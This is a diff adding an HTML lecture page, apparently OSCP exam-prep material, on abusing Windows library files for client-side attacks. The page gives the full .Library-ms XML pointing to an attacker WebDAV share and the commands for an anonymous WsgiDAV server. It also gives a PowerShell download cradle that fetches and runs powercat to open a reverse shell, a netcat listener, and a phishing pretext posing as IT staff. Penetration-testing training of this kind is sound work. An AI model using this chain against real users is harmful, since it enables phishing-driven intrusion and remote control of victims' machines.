@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lecture: Abusing Windows Library Files</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            line-height: 1.7;
+            margin: 0;
+            padding: 20px;
+            background-color: #0f172a; /* slate-900 - dark background */
+            color: #cbd5e1; /* slate-300 - light text */
+        }
+        .container {
+            max-width: 900px;
+            margin: auto;
+            background: #1e293b; /* slate-800 - content background */
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+        }
+        h1 {
+            text-align: center;
+            font-size: 4em;
+            border-bottom: 3px solid #22d3ee; /* cyan-400 */
+            padding-bottom: 15px;
+            color: #22d3ee; /* cyan-400 */
+        }
+        h2 {
+            font-size: 1.8em;
+            border-bottom: 2px solid #334155; /* slate-700 */
+            padding-bottom: 10px;
+            margin-bottom: 1.5rem;
+        }
+        h3 {
+            font-size: 1.4em;
+            color: #22d3ee; /* cyan-400 */
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+        }
+        h4 {
+            font-size: 1.25rem;
+            color: #94a3b8; /* slate-400 */
+            margin-top: 1.5rem;
+            margin-bottom: 0.75rem;
+        }
+        code {
+            background-color: #131720; /* Slightly darker code background */
+            color: #f1f5f9; /* slate-100 */
+            padding: 3px 6px;
+            border-radius: 4px;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.95em;
+        }
+        pre {
+            background-color: #131720; /* Dark code background */
+            color: #f1f5f9; /* slate-100 */
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-family: 'Courier New', Courier, monospace;
+            text-align: left;
+            margin-bottom: 20px;
+            border: 1px solid #334155;
+        }
+        ul, ol {
+            list-style: disc;
+            margin-left: 20px;
+        }
+        strong {
+            color: #f472b6; /* Pink for emphasis */
+        }
+        .note {
+            background-color: #083344; /* cyan-900 with opacity */
+            border-left: 4px solid #22d3ee; /* cyan-400 */
+            padding: 1rem;
+            border-radius: 0.5rem;
+            margin-top: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        .note strong {
+            color: #22d3ee;
+        }
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #334155; /* slate-700 */
+            color: #94a3b8; /* slate-400 */
+            font-size: 0.9em;
+        }
+        .social-icons {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            vertical-align: middle;
+        }
+        .social-icons img {
+            height: 1.2em;
+            vertical-align: middle;
+        }
+        a {
+            color: #22d3ee;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body class="bg-slate-900 text-slate-300 p-5">
+    <div class="container">
+        <header style="text-align: center; margin-bottom: 2rem;">
+            <h1>Learning Unit: Abusing Windows Library Files</h1>
+            <div style="background-color: #f8fafc; color: #1e293b; font-weight: bold; display: inline-flex; align-items:center; gap: 15px; text-align: center; padding: 8px 15px; margin-top: 15px; border-radius: 6px;">
+                <span style="color: #1e293b;">Presented by Hossam Shady (Red Nexus Academy)</span>
+                <a href="https://www.linkedin.com/in/hossam-ayman-123330193" target="_blank" class="social-icons">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/ca/LinkedIn_logo_initials.png" alt="LinkedIn">
+                </a>
+                <a href="https://wa.me/+201003425890" target="_blank" class="social-icons">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1200px-WhatsApp.svg.png" alt="WhatsApp">
+                </a>
+            </div>
+        </header>
+
+        <main>
+            <section class="mb-8">
+                <h2 class="text-xl font-bold text-slate-100 border-b-2 border-slate-700 pb-2 mb-4">Introduction & Learning Objectives</h2>
+                <p>
+                    This Learning Unit covers the following Learning Objectives:
+                </p>
+                <ul>
+                    <li><strong>Prepare an attack with Windows library files:</strong> Understand how to set up the necessary infrastructure and craft the initial payload.</li>
+                    <li><strong>Leverage Windows shortcuts to obtain code execution:</strong> Learn how to create a secondary payload that executes a reverse shell.</li>
+                </ul>
+                <p>
+                    While many security products focus on blocking malicious macros and social engineering training warns against them, this makes them a difficult vector to successfully execute. This unit explores a more subtle and less-known threat: <strong>Windows library files</strong>, which are equally effective for client-side attacks.
+                </p>
+            </section>
+
+            <section class="mb-8">
+                <h2 class="text-xl font-bold text-slate-100 border-b-2 border-slate-700 pb-2 mb-4">Understanding the Two-Stage Attack</h2>
+                <p>
+                    Windows library files are a fascinating attack vector because they leverage a trusted operating system feature. These files are virtual containers for user content and connect users with data stored in remote locations, like web servers or network shares. They have a <code>.Library-ms</code> file extension and are executed by simply double-clicking them.
+                </p>
+                <p>
+                    The attack uses a two-stage approach to bypass security and execute code:
+                </p>
+                <ol>
+                    <li><strong>Stage 1 (Initial Access):</strong> The victim is tricked into opening a <code>.Library-ms</code> file. This file, disguised as a normal folder, points to a remote WebDAV share you control. This step bypasses email filters that might block direct links or executable files.</li>
+                    <li><strong>Stage 2 (Code Execution):</strong> Once inside the "folder," the victim sees a seemingly harmless shortcut file (`.lnk`). When they double-click this second file, it executes a malicious command, giving you a reverse shell.</li>
+                </ol>
+            </section>
+
+            <section class="mb-8">
+                <h2 class="text-xl font-bold text-slate-100 border-b-2 border-slate-700 pb-2 mb-4">1. Setting up the WebDAV Server</h2>
+                <p>
+                    The WebDAV server is the heart of this attack's first stage. It's what hosts the malicious files and makes them appear as local content to the victim. We'll use <code>WsgiDAV</code> on a Kali system for this.
+                </p>
+                <p>
+                    <strong>Why WebDAV?</strong> Instead of sending a direct link to an executable, which is easily flagged, WebDAV allows the Windows operating system to natively connect to and display the contents of a remote share as if it were a local drive.
+                </p>
+                <pre><code>kali@kali:~$ pip3 install wsgidav</code></pre>
+                <p>
+                    Once installed, you'll create a directory for your share and start the server with the following command. The parameters are crucial for this attack:
+                </p>
+                <ul>
+                    <li><code>--host=0.0.0.0</code>: This tells WsgiDAV to listen on all network interfaces, making it accessible from your target.</li>
+                    <li><code>--port=80</code>: This uses the standard HTTP port, which is often open and less suspicious than a random port.</li>
+                    <li><code>--auth=anonymous</code>: This disables authentication, so the victim doesn't need to enter credentials to access your share.</li>
+                    <li><code>--root /home/kali/webdav/</code>: This specifies the directory on your Kali machine that the WebDAV server will serve.</li>
+                </ul>
+                <pre><code>kali@kali:~$ mkdir /home/kali/webdav
+kali@kali:~$ touch /home/kali/webdav/test.txt
+kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+...
+17:41:54.348 - INFO    : Serving on http://0.0.0.0:80 ..
+Listing 11 - Starting WsgiDAV on port 80</code></pre>
+                <p>
+                    This is your command and control server for the first stage.
+                </p>
+            </section>
+
+            <section class="mb-8">
+                <h2 class="text-xl font-bold text-slate-100 border-b-2 border-slate-700 pb-2 mb-4">2. Crafting the Windows Library File (.Library-ms)</h2>
+                <p>
+                    The library file is the key to bypassing email filters. It is a simple XML file that defines a connection to our WebDAV share.
+                </p>
+                <p>
+                    Here's a breakdown of the important XML tags from the provided code:
+                </p>
+                <ul>
+                    <li><code>&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;</code>: This tag gives the file a name from a Windows DLL. It's a key part of making the file look legitimate.</li>
+                    <li><code>&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;</code>: This sets the icon for the file. The index `-1003` is for the "Pictures" folder icon, making it appear harmless.</li>
+                    <li><code>&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;</code>: This GUID makes the folder display in Windows Explorer as a "Documents" folder, which further increases its perceived legitimacy.</li>
+                    <li><code>&lt;url&gt;http://192.168.119.2&lt;/url&gt;</code>: This is the most crucial part, as it's the link to your WebDAV server. This is where the magic happens, connecting the victim's machine to your malicious share.</li>
+                </ul>
+                <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt;
+&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
+&lt;version&gt;6&lt;/version&gt;
+&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
+&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
+&lt;templateInfo&gt;
+&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;
+&lt;/templateInfo&gt;
+&lt;searchConnectorDescriptionList&gt;
+&lt;searchConnectorDescription&gt;
+&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
+&lt;isSupported&gt;false&lt;/isSupported&gt;
+&lt;simpleLocation&gt;
+&lt;url&gt;http://192.168.119.2&lt;/url&gt;
+&lt;/simpleLocation&gt;
+&lt;/searchConnectorDescription&gt;
+&lt;/searchConnectorDescriptionList&gt;
+&lt;/libraryDescription&gt;
+Listing 17 - Windows Library code for connecting to our WebDAV Share</code></pre>
+                <p>
+                    <strong>Important Note:</strong> As you learned from the source material, Windows modifies the XML after you open it. For your exam, you must remember that you might have to reset the file to its original state each time you want to deliver it to a new target to ensure it works correctly.
+                </p>
+            </section>
+
+            <section class="mb-8">
+                <h2 class="text-xl font-bold text-slate-100 border-b-2 border-slate-700 pb-2 mb-4">3. Creating the Shortcut File (.lnk) and Payload</h2>
+                <p>
+                    This is where you get your shell! The `<strong>.lnk</strong>` file is a simple shortcut, but its power lies in what it executes. In this case, it's a PowerShell command that downloads and runs your payload.
+                </p>
+                <p>
+                    The PowerShell command is a <strong>download cradle</strong>. This is a common OSCP technique to fetch and execute a script from a remote server. The command uses `IEX` (Invoke-Expression) to run the script directly in memory, which is a great way to avoid writing files to the target's disk and potentially being caught by antivirus.
+                </p>
+                <pre><code>powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.119.3 -p 4444 -e powershell"</code></pre>
+                <p>
+                    This command first downloads PowerCat from a trusted public source (GitHub) and then uses it to start a reverse shell back to your Netcat listener. You'll need to set up a listener on your Kali machine to catch the shell.
+                </p>
+                <h3 class="text-lg font-bold text-cyan-400 mt-4 mb-2">Listener Setup</h3>
+                <pre><code>kali@kali:~$ nc -nvlp 4444</code></pre>
+            </section>
+
+            <section class="mb-8">
+                <h2 class="text-xl font-bold text-slate-100 border-b-2 border-slate-700 pb-2 mb-4">4. The Complete Attack Flow</h2>
+                <p>
+                    This entire attack hinges on a convincing social engineering pretext. The example email provided is a great model because it is concise, authoritative, and gives clear instructions.
+                </p>
+                <div class="note">
+                    <strong>Example Email Pretext:</strong> "Hello! My name is Dwight, and I'm a new member of the IT Team. This week I am completing some configurations we rolled out last week. To make this easier, I've attached a file that will automatically perform each step..."
+                </div>
+                <p>
+                    The final attack flow is:
+                </p>
+                <ol class="list-decimal pl-5">
+                    <li>Send the `config.Library-ms` file (via email or other means) to the victim.</li>
+                    <li>The victim, following the pretext, double-clicks the library file, and Windows Explorer connects to your WebDAV share.</li>
+                    <li>The victim double-clicks the `automatic_configuration.lnk` shortcut file, which appears in the folder.</li>
+                    <li>The PowerShell command executes, downloads PowerCat, and connects back to your Netcat listener.</li>
+                    <li>You successfully get a reverse shell.</li>
+                </ol>
+                <p>
+                    This technique is a perfect example of a multi-stage attack that relies on both technical vulnerabilities and human psychology, which are both crucial for the OSCP exam.
+                </p>
+            </section>
+
+            <footer>
+                <p>&copy; 2025 Offensive Security. All rights reserved.</p>
+                <a href="https://linktr.ee/rednexus" target="_blank"><p><strong>Red Nexus Academy</strong></p></a>
+            </footer>
+        </main>
+    </div>
+</body>
+</html>
